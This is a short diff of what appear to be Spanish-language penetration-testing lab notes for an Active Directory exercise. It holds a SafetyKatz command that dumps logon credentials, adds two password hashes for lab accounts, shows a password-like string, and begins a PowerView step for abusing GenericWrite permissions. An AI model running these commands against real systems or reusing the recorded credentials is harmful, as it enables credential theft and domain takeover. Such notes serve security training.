@@ -44,6 +44,11 @@ P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
 ### Obtener credenciales
 - [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
 
+studvm$  -> 95dad9bc92763efe74968c2fcccc3b61 
+studentuser -> 686079be7b2a8fae60d502ddc416b2e0 
+
+
+
 ### MGMTSRV GenericWrite
 - [ ] Nueva Shell con *InviShell* y *PowerView*
 - [ ] `$sid = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"`
